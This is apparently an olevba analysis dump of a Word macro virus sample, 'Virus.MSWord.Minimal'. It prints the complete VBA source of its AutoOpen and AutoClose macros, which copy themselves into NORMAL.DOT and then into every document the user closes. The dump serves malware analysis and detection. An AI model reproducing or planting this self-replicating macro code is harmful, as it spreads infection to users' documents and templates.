olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Minimal.lx
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Minimal.lx - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: ./Virus.MSWord.Minimal.lx - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim count_
Dim w$

WordBasic.EditReplace Find:=" ", Replace:=" ", Direction:=0, MatchCase:=0, WholeWord:=0, PatternMatch:=0, SoundsLike:=0, ReplaceAll:=1, Format:=0, Wrap:=1

count_ = WordBasic.CountMacros(1)
        w$ = WordBasic.[MacroName$](count_, 1)
If w$ = "aaaaa" Then GoTo t Else
WordBasic.Organizer Копировать:=1, Source:=WordBasic.[DefaultDir$](2) + "\NORMAL.DOT", Destination:=WordBasic.[FileName$](), Name:="AutoClose", Tab:=3

 WordBasic.Organizer Копировать:=1, Source:=WordBasic.[DefaultDir$](2) + "\NORMAL.DOT", Destination:=WordBasic.[FileName$](), Name:="AutoOpen", Tab:=3

t:
WordBasic.FileSave
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: ./Virus.MSWord.Minimal.lx - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()

WordBasic.Organizer Копировать:=1, Source:=WordBasic.[FileName$](), Destination:=WordBasic.[DefaultDir$](2) + "\NORMAL.DOT", Name:="AutoClose", Tab:=3

WordBasic.Organizer Копировать:=1, Source:=WordBasic.[FileName$](), Destination:=WordBasic.[DefaultDir$](2) + "\NORMAL.DOT", Name:="AutoOpen", Tab:=3

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

